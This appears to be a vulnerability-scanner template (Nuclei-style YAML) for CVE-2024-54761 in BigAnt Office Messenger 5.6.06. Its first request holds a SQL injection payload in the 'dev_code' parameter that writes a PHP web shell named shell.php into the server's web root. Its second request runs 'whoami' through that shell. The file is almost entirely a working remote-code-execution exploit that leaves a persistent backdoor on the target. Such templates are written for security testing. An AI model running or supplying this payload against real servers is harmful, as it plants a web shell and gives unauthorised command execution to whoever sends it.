id: cve-2024-54761

info:
  name: CVE-2024-54761
  author: 3th1c_yuk1
  severity: critical
  description: BigAnt Office Messenger 5.6.06 is vulnerable to SQL Injection via the 'dev_code' parameter.
  reference: https://github.com/nscan9/CVE-2024-54761-BigAnt-Office-Messenger-5.6.06-RCE-via-SQL-Injection?tab=readme-ov-file

http:
  - id: step1
    raw:
      - |
        GET /index.php/Admin/user/index/clientid/1.html?dev_code=';SELECT+<?echo+system($_GET["cmd"]);?>INTO+OUTFILE+"C:/Program Files+(x86)/BigAntSoft/IM+Console/im_webserver/htdocs/shell.php"-- HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "shell.php"
        part: body

  - id: step2
    raw:
      - |
        GET /shell.php?cmd=whoami HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "(?i)nt authority\\system"
        part: body
      - type: regex
        regex:
          - "(?i)root:x:x"
        part: body
